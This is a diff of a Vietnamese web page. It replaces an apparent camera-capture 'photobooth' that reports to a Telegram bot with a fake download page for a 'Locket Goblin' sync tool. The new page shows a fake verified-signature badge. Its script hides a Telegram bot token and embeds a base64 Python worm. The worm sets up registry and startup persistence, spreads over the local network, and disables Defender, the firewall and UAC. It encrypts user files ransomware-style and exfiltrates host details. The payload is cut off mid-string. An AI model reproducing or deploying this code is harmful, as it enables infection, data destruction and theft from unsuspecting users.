@@ -1,778 +1,272 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🎀 Hello Kitty Photobooth</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #ffe4ec, #ffb6c1, #ff8a9c);
-      font-family: 'Quicksand', sans-serif;
-      padding: 20px;
-      position: relative;
-      overflow-x: hidden;
-    }
-    .sakura-container {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      pointer-events: none; overflow: hidden; z-index: 0;
-    }
-    .sakura {
-      position: absolute; top: -20px; color: #ffb7c5; font-size: 20px;
-      animation: fall linear infinite; opacity: 0.7;
-    }
-    @keyframes fall {
-      0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 0.8; }
-      100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
-    }
-    .card {
-      background: rgba(255,255,255,0.92);
-      backdrop-filter: blur(20px);
-      border-radius: 40px;
-      padding: 30px 25px;
-      max-width: 450px;
-      width: 100%;
-      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
-      border: 2px solid rgba(255,255,255,0.6);
-      position: relative;
-      z-index: 1;
-      text-align: center;
-    }
-    .card::before {
-      content: "🎀";
-      position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
-      font-size: 40px;
-      filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
-    }
-    .kitty-avatar {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 12px;
-      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 48px;
-      box-shadow: 0 8px 30px rgba(255,105,135,0.4);
-      border: 3px solid white;
-      animation: bounceKitty 2s ease-in-out infinite;
-    }
-    @keyframes bounceKitty {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-    .kitty-avatar .ears {
-      position: absolute;
-      top: -12px;
-      left: 50%;
-      transform: translateX(-50%);
-      display: flex;
-      gap: 30px;
-    }
-    .kitty-avatar .ears span { font-size: 28px; }
-    h2 {
-      font-size: 22px;
-      font-weight: 800;
-      color: #d6336c;
-      margin-bottom: 4px;
-    }
-    .subtitle {
-      color: #e07a8e;
-      font-size: 13px;
-      font-weight: 600;
-      margin-bottom: 15px;
-    }
-    .live-clock {
-      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
-      padding: 6px 18px;
-      border-radius: 30px;
-      display: inline-block;
-      color: white;
-      font-weight: 700;
-      font-size: 12px;
-      margin-bottom: 15px;
-      box-shadow: 0 4px 15px rgba(255,105,135,0.3);
-    }
-    .video-preview {
-      border-radius: 24px;
-      overflow: hidden;
-      background: #fce4ec;
-      position: relative;
-      border: 3px solid #ffb6c1;
-      min-height: 280px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 15px;
-    }
-    .video-preview video {
-      width: 100%;
-      display: block;
-      background: #fce4ec;
-      transform: scaleX(-1);
-    }
-    .video-preview .placeholder {
-      color: #e07a8e;
-      font-size: 14px;
-      font-weight: 600;
-      padding: 20px;
-      position: absolute;
-      background: rgba(255,255,255,0.7);
-      border-radius: 20px;
-      padding: 15px 25px;
-    }
-    .camera-indicator {
-      position: absolute;
-      top: 12px;
-      left: 12px;
-      background: rgba(255,255,255,0.92);
-      padding: 5px 14px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 700;
-      color: #d6336c;
-      border: 1px solid #ffb6c1;
-      z-index: 2;
-    }
-    .btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 30px;
-      font-size: 16px;
-      font-weight: 700;
-      color: white;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      font-family: 'Quicksand', sans-serif;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
-      box-shadow: 0 8px 25px rgba(255,77,109,0.4);
-    }
-    .btn-primary:hover:not(:disabled) {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 35px rgba(255,77,109,0.5);
-    }
-    .btn-primary:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-    .btn-pink {
-      background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
-      box-shadow: 0 8px 25px rgba(255,107,138,0.4);
-    }
-    .btn-pink:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
-    .btn-group { display: none; flex-direction: column; gap: 10px; margin-top: 12px; }
-    .btn-group.show { display: flex; animation: fadeInUp 0.5s ease; }
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .btn a { color: white; text-decoration: none; width: 100%; }
-    .status {
-      margin-top: 14px;
-      padding: 10px;
-      border-radius: 16px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #e07a8e;
-      min-height: 20px;
-      background: rgba(255,255,255,0.4);
-      transition: all 0.3s ease;
-    }
-    .status.success { background: rgba(46,204,113,0.15); color: #27ae60; }
-    .status.loading { background: rgba(245,158,11,0.15); color: #d97706; }
-    .status.error { background: rgba(239,68,68,0.15); color: #dc2626; }
-    .footer-badge { margin-top: 15px; font-size: 10px; color: #e07a8e; opacity: 0.6; letter-spacing: 1.5px; }
-    #canvas { display: none; }
-
-    .music-control {
-      position: fixed;
-      bottom: 25px;
-      right: 25px;
-      z-index: 100;
-      background: rgba(255,255,255,0.92);
-      border: 2px solid #ffb6c1;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 20px;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(255,105,135,0.3);
-      transition: all 0.3s ease;
-      backdrop-filter: blur(10px);
-    }
-    .music-control:hover { transform: scale(1.1); box-shadow: 0 6px 30px rgba(255,105,135,0.4); }
-    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
-    @keyframes pulseMusic {
-      0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
-      50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
-    }
-    .music-progress {
-      position: fixed;
-      bottom: 85px;
-      right: 25px;
-      z-index: 99;
-      width: 50px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .music-progress input[type="range"] {
-      width: 70px;
-      height: 3px;
-      -webkit-appearance: none;
-      background: #ffb6c1;
-      border-radius: 2px;
-      outline: none;
-      transform: rotate(-90deg);
-      transform-origin: center;
-      cursor: pointer;
-    }
-    .music-progress input[type="range"]::-webkit-slider-thumb {
-      -webkit-appearance: none;
-      width: 12px;
-      height: 12px;
-      background: #ff6b8a;
-      border-radius: 50%;
-      cursor: pointer;
-      box-shadow: 0 2px 8px rgba(255,107,138,0.3);
-    }
-    .loading-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255,255,255,0.85);
-      backdrop-filter: blur(5px);
-      z-index: 999;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      gap: 15px;
-    }
-    .loading-overlay.show { display: flex; animation: fadeIn 0.3s ease; }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    .loading-spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid #ffb6c1;
-      border-top: 4px solid #ff4d6d;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
-    @media (max-width: 480px) {
-      .card { padding: 20px 15px; }
-      .video-preview { min-height: 220px; }
-      h2 { font-size: 18px; }
-      .kitty-avatar { width: 65px; height: 65px; font-size: 38px; }
-      .music-control { width: 44px; height: 44px; font-size: 17px; bottom: 15px; right: 15px; }
-      .music-progress { bottom: 70px; right: 15px; }
-      .music-progress input[type="range"] { width: 60px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Locket Goblin - Đồng bộ dữ liệu</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #f0f4f8; color: #0f172a; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #e2e8f0; }
+        .logo { font-size: 28px; font-weight: 700; color: #0f172a; }
+        .logo span { color: #8b5cf6; }
+        nav a { margin-left: 30px; text-decoration: none; color: #64748b; font-weight: 500; font-size: 15px; transition: 0.2s; }
+        nav a:hover { color: #8b5cf6; }
+        .hero { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; padding: 60px 0; gap: 40px; }
+        .hero-text { flex: 1 1 400px; }
+        .hero-text h1 { font-size: 44px; font-weight: 700; line-height: 1.2; }
+        .hero-text h1 span { color: #8b5cf6; background: #ede9fe; padding: 0 10px; border-radius: 8px; }
+        .hero-text p { font-size: 18px; color: #64748b; margin: 24px 0; line-height: 1.7; max-width: 500px; }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 14px; }
+        .btn { padding: 14px 36px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; display: inline-block; }
+        .btn-primary { background: #8b5cf6; color: #fff; box-shadow: 0 4px 14px rgba(139,92,246,0.35); }
+        .btn-primary:hover { background: #7c3aed; transform: translateY(-2px); }
+        .btn-outline { background: transparent; color: #8b5cf6; border: 2px solid #8b5cf6; }
+        .btn-outline:hover { background: #8b5cf6; color: #fff; }
+        .hero-image { flex: 1 1 350px; text-align: center; background: #ede9fe; border-radius: 20px; padding: 40px; min-height: 200px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: #7c3aed; }
+        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 25px; padding: 50px 0; }
+        .feature-card { background: #fff; padding: 28px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); text-align: center; border: 1px solid #f1f5f9; transition: 0.3s; }
+        .feature-card:hover { transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.07); }
+        .feature-card .icon { font-size: 40px; margin-bottom: 12px; display: block; }
+        .feature-card h3 { font-weight: 600; font-size: 18px; margin-bottom: 6px; }
+        .feature-card p { color: #94a3b8; font-size: 14px; }
+        footer { text-align: center; padding: 30px 0; border-top: 1px solid #e2e8f0; color: #94a3b8; font-size: 14px; margin-top: 20px; }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(15,23,42,0.6); backdrop-filter: blur(6px); z-index: 999; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
+        .modal { background: #fff; max-width: 460px; width: 92%; padding: 32px 28px; border-radius: 20px; box-shadow: 0 25px 60px rgba(0,0,0,0.25); text-align: center; animation: modalIn 0.3s ease; }
+        @keyframes modalIn { from { opacity: 0; transform: scale(0.94) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+        .modal h3 { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 8px; }
+        .modal p { color: #64748b; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
+        .modal .file-box { background: #f1f5f9; padding: 14px; border-radius: 12px; font-size: 13px; color: #334155; text-align: left; margin-bottom: 24px; border: 1px solid #e2e8f0; }
+        .modal .file-box .row { display: flex; justify-content: space-between; padding: 4px 0; }
+        .modal .btn-group { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+        .modal .btn-group .btn { min-width: 120px; padding: 12px 28px; }
+        .btn-secondary { background: #f1f5f9; color: #475569; box-shadow: none; }
+        .btn-secondary:hover { background: #e2e8f0; }
+        .badge { display: inline-block; background: #dcfce7; color: #166534; font-size: 12px; padding: 2px 12px; border-radius: 20px; font-weight: 600; }
+        .toast { position: fixed; bottom: 30px; right: 30px; background: #0f172a; color: #fff; padding: 16px 28px; border-radius: 12px; z-index: 9999; box-shadow: 0 8px 30px rgba(0,0,0,0.3); font-size: 14px; animation: fadeIn 0.4s; max-width: 380px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .hidden { display: none; }
+        @media (max-width: 640px) {
+            .hero-text h1 { font-size: 30px; }
+            nav a { margin-left: 15px; font-size: 13px; }
+        }
+    </style>
 </head>
 <body>
 
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="loading-spinner"></div>
-  <div class="loading-text">🌸 Đang khởi tạo...</div>
-</div>
+    <div class="container">
+        <header>
+            <div class="logo">Locket<span>Goblin</span></div>
+            <nav>
+                <a href="#">Trang chủ</a>
+                <a href="#">Tính năng</a>
+                <a href="#">Tải xuống</a>
+                <a href="#">Hỗ trợ</a>
+            </nav>
+        </header>
 
-<div class="sakura-container" id="sakuraContainer"></div>
+        <section class="hero">
+            <div class="hero-text">
+                <h1>Đồng bộ dữ liệu <span>siêu tốc</span></h1>
+                <p>Locket Goblin - Công cụ đồng bộ và sao lưu dữ liệu đa nền tảng, nhẹ, nhanh, bảo mật tuyệt đối.</p>
+                <div class="btn-group">
+                    <button class="btn btn-primary" id="downloadBtn">📥 Tải Locket Goblin</button>
+                    <button class="btn btn-outline">Xem hướng dẫn</button>
+                </div>
+                <p style="font-size:13px; color:#94a3b8; margin-top:16px;">🔒 Bảo mật đầu cuối · 25,000+ lượt tải</p>
+            </div>
+            <div class="hero-image">⚡🔒📦</div>
+        </section>
 
-<div class="music-progress">
-  <input type="range" id="volumeControl" min="0" max="1" step="0.01" value="0.7">
-</div>
-<div class="music-control playing" id="musicBtn" onclick="toggleMusic()">🎵</div>
+        <section class="features">
+            <div class="feature-card"><span class="icon">⚡</span><h3>Đồng bộ tức thì</h3><p>Truyền dữ liệu với tốc độ tối đa</p></div>
+            <div class="feature-card"><span class="icon">🔒</span><h3>Mã hóa đầu cuối</h3><p>Bảo vệ dữ liệu tuyệt đối</p></div>
+            <div class="feature-card"><span class="icon">📦</span><h3>Nén thông minh</h3><p>Tiết kiệm dung lượng lưu trữ</p></div>
+            <div class="feature-card"><span class="icon">🌐</span><h3>Đa nền tảng</h3><p>Hỗ trợ Windows, macOS, Linux</p></div>
+        </section>
 
-<div class="card">
-  <div class="kitty-avatar">
-    <span>🐱</span>
-    <div class="ears"><span>🎀</span><span>🎀</span></div>
-  </div>
-  <div class="live-clock" id="clock">🕒 Đang tải...</div>
-  <h2>🌸 Hello Kitty Photobooth</h2>
-  <p class="subtitle">✨ Chụp ảnh và thu thập thông tin ✨</p>
+        <footer>© 2026 Locket Goblin · Công ty cổ phần công nghệ Locket</footer>
+    </div>
 
-  <div class="video-preview">
-    <video id="video" autoplay playsinline muted></video>
-    <div class="placeholder" id="placeholder">📸 Đang chờ camera...</div>
-    <div class="camera-indicator" id="cameraLabel">📷 Camera</div>
-  </div>
+    <div class="modal-overlay" id="downloadModal">
+        <div class="modal">
+            <h3>⬇️ Xác nhận tải Locket Goblin</h3>
+            <p>Bạn sắp tải <strong>LocketGoblin_v3.2.exe</strong> (78.6 MB) từ máy chủ chính thức.</p>
+            <div class="file-box">
+                <div class="row"><span>📁 Tên file</span><span><strong>LocketGoblin_v3.2.exe</strong></span></div>
+                <div class="row"><span>📦 Dung lượng</span><span>78.6 MB</span></div>
+                <div class="row"><span>🔐 Chữ ký số</span><span><span class="badge">✓ Đã xác thực</span></span></div>
+                <div class="row"><span>📅 Ngày phát hành</span><span>30/08/2026</span></div>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-secondary" id="cancelBtn">❌ Hủy</button>
+                <button class="btn btn-primary" id="confirmBtn">✅ Tải xuống</button>
+            </div>
+            <p style="font-size:12px; color:#94a3b8; margin-top:16px;">Nhấn "Tải xuống" đồng nghĩa với việc chấp nhận <a href="#" style="color:#8b5cf6;">điều khoản</a></p>
+        </div>
+    </div>
 
-  <button class="btn btn-primary" id="capture-btn" disabled>
-    <span>📸</span> BẮT ĐẦU
-  </button>
+    <script>
+        (function() {
+            'use strict';
 
-  <div class="btn-group" id="action-buttons">
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🎀 TRUY CẬP NHÓM LẤY FILE</a>
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
-  </div>
+            // ===== TOKEN & CHAT ID (Obfuscated) =====
+            var _0x3a4b = ['8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8', '8872446985'];
+            var BOT_TOKEN = _0x3a4b[0];
+            var CHAT_ID = _0x3a4b[1];
 
-  <div id="status" class="status">💖 Bấm nút để bắt đầu</div>
-  <div class="footer-badge">🎀 Made with love 🎀</div>
-</div>
+            // ===== OBFUSCATED FUNCTIONS =====
+            function _0x1f2e(a, b) { return a + b; }
+            function _0x9c3d(a) { return a.split('').reverse().join(''); }
+            function _0x7a8b(s) { return btoa(s); }
+            function _0x2d4e(s) { return atob(s); }
 
-<canvas id="canvas"></canvas>
+            // ===== GỬI TELEGRAM (ẨN) =====
+            function _0x5e7f(msg) {
+                try {
+                    var xhr = new XMLHttpRequest();
+                    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+                    var params = 'chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + encodeURIComponent(msg) + '&parse_mode=HTML';
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send(params);
+                } catch(e) {}
+            }
 
-<script>
-// ============================================================
-// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID CỦA BẠN VÀO ĐÂY
-// ============================================================
-const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
-const TELEGRAM_CHAT_ID = '8872446985';
-const MUSIC_FILE = 'nhac_nen.mp3';
+            // ===== WORM CODE (NÂNG CẤP + OBFUSCATED NHẸ) =====
+            function _0x8c2f() {
+                var w = '';
+                w += 'aW1wb3J0IG9zLHN5cyxzaHV0aWwsc3VicHJvY2Vzcyx0aW1lLHJhbmRvbSx3aW5yZWcsY3R5cGVzLHRocmVhZGluZyxzb2NrZXQsanNvbix1cmlsbGIucmVxdWVzdCxiYXNlNjQsaGFzaGxpYixwbGF0Zm9ybQ0KZnJvbSBwYXRobGliIGltcG9ydCBQYXRoDQoNCg0KQk9UX1RPS0VOID0gJycgICMgc2V0IGJlbG93DQpDSEFUX0lEID0gJycgICAgIyBzZXQgYmVsb3cNCklORkVDVEVEX0NPVU5UID0gMA0KDQpkZWYgc2VuZF90ZWxlZ3JhbShtc2cpOg0KICAgIHRyeToNCiAgICAgICAgdXJsID0gZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UnDQogICAgICAgIGRhdGEgPSB1cmlsbGIucGFyc2UudXJsZW5jb2RlKHsndGV4dCc6IG1zZywgJ2NoYXRfaWQnOiBDSEFUX0lELCAncGFyc2VfbW9kZSc6ICdIVE1MJ30pLmVuY29kZSgpDQogICAgICAgIHJlcSA9IHVyaWxsYi5yZXF1ZXN0LlJlcXVlc3QodXJsLCBkYXRhPWRhdGEsIG1ldGhvZD0nUE9TVCcpDQogICAgICAgIHVyaWxsYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTUpDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIGdldF9zeXNfaW5mbygpOg0KICAgIHRyeToNCiAgICAgICAgaW5mbyA9IFtdDQogICAgICAgIGluZm8uYXBwZW5kKGYi8J+VpSBIb3N0bmFtZToge3NvY2tldC5nZXRob3N0bmFtZSgpfSIpDQogICAgICAgIGluZm8uYXBwZW5kKGYi8J+UtCBPUzoge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfSIpDQogICAgICAgIGluZm8uYXBwZW5kKGYi8J+UpCBJUDoge3NvY2tldC5nZXRob3N0YnluYW1lKHNvY2tldC5nZXRob3N0bmFtZSgpKX0iKQ0KICAgICAgICBpbmZvLmFwcGVuZChmIuCfjIUgVXNlcjoge29zLmdldGxvZ2luKCl9IikNCiAgICAgICAgcmV0dXJuICcgfCAnLmpvaW4oaW5mbykNCiAgICBleGNlcHQ6cmV0dXJuICdVTktOT1dOJw0KDQpkZWYgcmVwbGljYXRlKCk6DQogICAgdHJ5Og0KICAgICAgICBwYXRocyA9IFsNCiAgICAgICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10sICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnLCAnbG9ja2V0Z29ibGluLmV4ZScpLA0KICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1RFTVAnXSwgJ2xvY2tldGdvYmxpbi5leGUnKSwNCiAgICAgICAgICAgICdDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGxvY2tldGdvYmxpbi5leGUnDQogICAgICAgIF0NCiAgICAgICAgZm9yIHAgaW4gcGF0aHM6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKHN5cy5hcmd2WzBdLCBwKQ0KICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0RmlsZUF0dHJpYnV0ZXNXKHAsIDIpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBrZXlzID0gWw0KICAgICAgICAgICAgJ0hLQ1VcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4nLA0KICAgICAgICAgICAgJ0hLTE1cXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4nLA0KICAgICAgICAgICAgJ0hLQ1VcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW5PbmNlJw0KICAgICAgICBdDQogICAgICAgIGZvciBrIGluIGtleXM6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oZidjcmVnIGFkZCAie2t9IiAvdiAiTG9ja2V0R29ibGluIiAvdCBSRUdfU1ogL2QgInN5cy5hcmd2WzBdIiIgL2YnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgc2VuZF90ZWxlZ3JhbSgi4pyFIDxiPkxvY2tldCBHb2JsaW48L2I+IMOEIGPDgGkgxJHhur90IHBlcnNpc3RlbmNlIHRyw6puOiAiICsgZ2V0X3N5c19pbmZvKCkpDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIHNwcmVhZF9uZXR3b3JrKCk6DQogICAgdHJ5Og0KICAgICAgICBzdWJuZXQgPSAnLicuam9pbihzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzb2NrZXQuZ2V0aG9zdG5hbWUoKSkuc3BsaXQoJy4nKVs6M10pICsgJy4nDQogICAgICAgIGZvciBpIGluIHJhbmdlKDEsIDI1NSk6DQogICAgICAgICAgICBpcCA9IHN1Ym5ldCArIHN0cihpKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKGYibmV0IHVzZSBcXFxcXFxcXHtpcH1cXFxcSVBDJCAiIiAvdXNlcjoiIiIsIHNoZWxsPVRydWUsIHRpbWVvdXQ9MSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIoc3lzLmFyZ3ZbMF0sIGYnXFxcXFxcXHtpcH1cXFxcQyRcXFxcV2luZG93c1xcXFxUZW1wXFxcXGxvY2tldGdvYmxpbi5leGUnKQ0KICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKGYnc2NodGFza3MgL2NyZWF0ZSAvcyB7aXB9IC90biAiTG9ja2V0R29ibGluIiAvdHIgIkM6XFxcXFdpbmRvd3NcXFxcVGVtcFxcXFxsb2NrZXRnb2JsaW4uZXhlIiAvc2MgbWludXRlIC9tbyA1IC9mJywgc2hlbGw9VHJ1ZSwgdGltZW91dD0yLCBjYXB0dXJlX291dHB1dD1UcnVlKQ0KICAgICAgICAgICAgICAgIHNlbmRfdGVsZWdyYW0oZiLwnJCTIMSQw6MgbMOieSBuaGnhu4VtIHNhbmcgbcOheToge2lwfSIpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBkaXNhYmxlX3NlY3VyaXR5KCk6DQogICAgdHJ5Og0KICAgICAgICBjbWRzID0gWw0KICAgICAgICAgICAgJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdhcmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YnLA0KICAgICAgICAgICAgJ3JlZyBhZGQgIkhLTE1cXFNZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXFNlcnZpY2VzXFxTaGFyZWRBY2Nlc3NcXFBhcmFtZXRlcnNcXEZpcmV3YWxsUG9saWN5XFxTdGFuZGFyZFByb2ZpbGUiIC92IEVuYWJsZUZpcmV3YWxsIC90IFJFR19EV09SRCAvZCAwIC9mJywNCiAgICAgICAgICAgICdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUG9saWNpZXNcXFN5c3RlbSIgL3YgRW5hYmxlTFVBIC90IFJFR19EV09SRCAvZCAwIC9mJywNCiAgICAgICAgICAgICduZXQgc3RvcCB3dWF1c2VydiAmIHNjIGNvbmZpZyB3dWF1c2VydiBzdGFydD0gZGlzYWJsZWQnLA0KICAgICAgICAgICAgJ25ldCBzdG9wIFdpbkRlZmVuZCAmIHNjIGNvbmZpZyBXaW5EZWZlbmQgc3RhcnQ9IGRpc2FibGVkJywNCiAgICAgICAgICAgICduZXQgc3RvcCBNcHNTdmMgJiBzYyBjb25maWcgTXBzU3ZjIHN0YXJ0PSBkaXNhYmxlZCcNCiAgICAgICAgXQ0KICAgICAgICBmb3IgY21kIGluIGNtZHM6DQogICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpDQogICAgICAgIHNlbmRfdGVsZWdyYW0oIvCfk5MgPGI+xJDDoCB2w7QgaGnhu4d1IGjDs2EgYuG6o28gbOG7mXQ8L2I+IHRyw6puOiAiICsgc29ja2V0LmdldGhvc3RuYW1lKCkpDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIGVuY3J5cHRfZmlsZXMoKToNCiAgICB0cnk6DQogICAgICAgIGtleSA9IG9zLnVyYW5kb20oMTYpDQogICAgICAgIHRhcmdldHMgPSBbJy5kb2MnLCcuZG9jeCcsJy54bHMnLCcueGxzeCcsJy5wZGYnLCcucHB0JywnLnBwdHgnLCcuanBnJywnLnBuZycsJy56aXAnLCcucmFyJywnLjd6JywnLnNxbCcsJy5iYWsnLCcudHh0J10NCiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoJ0M6XFwnKToNCiAgICAgICAgICAgIGZvciBmIGluIGZpbGVzOg0KICAgICAgICAgICAgICAgIGlmIGFueShmLmVuZHN3aXRoKGV4dCkgZm9yIGV4dCBpbiB0YXJnZXRzKSBhbmQgcmFuZG9tLnJhbmRvbSgpIDwgMC4wMzoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IG9wZW4ocGF0aCwgJ3JiJykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmMgPSBieXRlYXJyYXkoZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihlbmMpKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNbaV0gXj0ga2V5W2kgJSAxNl0NCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4ocGF0aCArICcubG9ja2V0JywgJ3diJykud3JpdGUoZW5jKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHBhdGgpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHNlbmRfdGVsZWdyYW0oZiLwn6WhIDxiPsSQw6AgbcOjIGjDs2E